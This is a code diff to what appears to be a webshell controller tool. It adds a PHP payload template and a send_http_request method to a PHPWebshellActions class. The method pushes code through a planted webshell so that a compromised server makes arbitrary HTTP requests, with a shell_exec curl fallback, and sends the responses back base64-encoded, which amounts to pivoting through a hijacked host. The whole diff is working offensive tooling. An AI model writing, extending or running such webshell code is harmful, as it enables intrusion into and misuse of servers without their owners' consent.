@@ -28,6 +28,7 @@ from .base import (
     PHPSessionInterface,
     DirectoryEntry,
     BasicInfoEntry,
+    HttpResponseDict,
     Option,
     OptionAlternative,
 )
@@ -327,6 +328,112 @@ if(!function_exists("curl_init")) {
         decoder_echo(base64_encode($result));
     }
 }
+"""
+)
+
+HTTP_REQUEST_PHP = compress_phpcode_template(
+    """
+$url = {url};
+$method = {method};
+$headers = json_decode({headers}, true);
+$params = json_decode({params}, true);
+$data = {data};
+
+function send_http_request($url, $method, $headers, $params, $data) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        if (!empty($params)) {
+            $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($params);
+        }
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+        if (!empty($headers)) {
+            $header_array = [];
+            foreach ($headers as $key => $value) {
+                $header_array[] = "$key: $value";
+            }
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array);
+        }
+        if (!empty($data)) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        }
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $response = curl_exec($ch);
+        $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $headers_str = substr($response, 0, $header_size);
+        $body = substr($response, $header_size);
+        curl_close($ch);
+        $headers_arr = [];
+        $header_lines = explode("\\r\\n", $headers_str);
+        foreach ($header_lines as $line) {
+            if (strpos($line, ':') !== false) {
+                list($key, $value) = explode(':', $line, 2);
+                $headers_arr[trim($key)] = trim($value);
+            }
+        }
+        return [
+            'status_code' => $status_code,
+            'headers' => $headers_arr,
+            'body' => base64_encode($body)
+        ];
+    } else {
+        $cmd = 'curl -s -i -X ' . escapeshellarg($method);
+        if (!empty($headers)) {
+            foreach ($headers as $key => $value) {
+                $cmd .= ' -H "' . escapeshellarg("$key: $value") . '"';
+            }
+        }
+        if (!empty($params)) {
+            $url .= (strpos($url, '?') === false ? '?' : '&') . http_build_query($params);
+        }
+        if (!empty($data)) {
+            $tmpfile = tempnam(sys_get_temp_dir(), 'curl');
+            file_put_contents($tmpfile, $data);
+            $cmd .= ' --data-binary @' . escapeshellarg($tmpfile);
+        }
+        $cmd .= ' ' . escapeshellarg($url);
+        $response = shell_exec($cmd);
+        if (!empty($tmpfile) && file_exists($tmpfile)) {
+            unlink($tmpfile);
+        }
+        if ($response === null) {
+            return [
+                'status_code' => 0,
+                'headers' => [],
+                'body' => base64_encode('curl command failed')
+            ];
+        }
+        $parts = explode("\\r\\n\\r\\n", $response, 2);
+        if (count($parts) < 2) {
+            $headers_str = '';
+            $body = $response;
+        } else {
+            list($headers_str, $body) = $parts;
+        }
+        $status_code = 200;
+        $header_lines = explode("\\r\\n", $headers_str);
+        if (!empty($header_lines[0]) && preg_match('/HTTP\\/[0-9\\.]+\\s+(\\d+)/', $header_lines[0], $matches)) {
+            $status_code = (int)$matches[1];
+        }
+        $headers_arr = [];
+        foreach ($header_lines as $line) {
+            if (strpos($line, ':') !== false) {
+                list($key, $value) = explode(':', $line, 2);
+                $headers_arr[trim($key)] = trim($value);
+            }
+        }
+        return [
+            'status_code' => $status_code,
+            'headers' => $headers_arr,
+            'body' => base64_encode($body)
+        ];
+    }
+}
+$result = send_http_request($url, $method, $headers, $params, $data);
+decoder_echo(json_encode($result));
 """
 )
 
@@ -1182,6 +1289,79 @@ class PHPWebshellActions(PHPSessionInterface):
 
     async def submit(self, payload: str) -> str:
         raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
+
+    async def send_http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: t.Optional[t.Dict[str, str]] = None,
+        params: t.Optional[t.Dict[str, str]] = None,
+        data: t.Optional[t.Union[str, bytes]] = None,
+    ) -> HttpResponseDict:
+        """发送HTTP请求到目标服务器
+        
+        Args:
+            url: 请求URL
+            method: HTTP方法，默认GET
+            headers: 请求头字典
+            params: 查询参数字典
+            data: 请求体数据（字符串或字节）
+            
+        Returns:
+            HttpResponseDict: 包含status_code, headers, body的字典
+        """
+        from .base import HttpResponseDict
+        # 类型注解使用字符串字面量以避免导入问题
+        
+        # 准备参数
+        headers = headers or {}
+        params = params or {}
+        # 处理data参数，可能是str或bytes
+        if data is None:
+            data_str = ""
+        elif isinstance(data, bytes):
+            data_str = data.decode('utf-8', errors='ignore')
+        else:
+            data_str = data
+        
+        # 使用HTTP_REQUEST_PHP模板
+        php_code = format_phpcode(
+            HTTP_REQUEST_PHP,
+            url=string_repr(url),
+            method=string_repr(method),
+            headers=string_repr(json.dumps(headers)),
+            params=string_repr(json.dumps(params)),
+            data=string_repr(data_str),
+        )
+        
+        # 提交执行
+        json_result = await self.submit(php_code)
+        
+        # 解析结果
+        try:
+            result = json.loads(json_result)
+        except json.JSONDecodeError as exc:
+            raise exceptions.PayloadOutputError(
+                f"解析HTTP响应失败，返回的不是有效的JSON: {json_result[:100]}"
+            ) from exc
+        
+        # 验证结果结构
+        required_keys = {"status_code", "headers", "body"}
+        if not all(key in result for key in required_keys):
+            raise exceptions.PayloadOutputError(
+                f"HTTP响应缺少必要字段，需要: {required_keys}, 实际: {list(result.keys())}"
+            )
+        
+        # 解码body（base64编码）
+        try:
+            body_decoded = base64.b64decode(result["body"])
+            result["body"] = body_decoded
+        except Exception as exc:
+            raise exceptions.PayloadOutputError(
+                "无法解码base64格式的响应体"
+            ) from exc
+        
+        return result
 
     async def submit_http(self, payload: str) -> t.Tuple[int, str]:
         raise NotImplementedError("子类提供这个函数以驱动这些Actions函数")
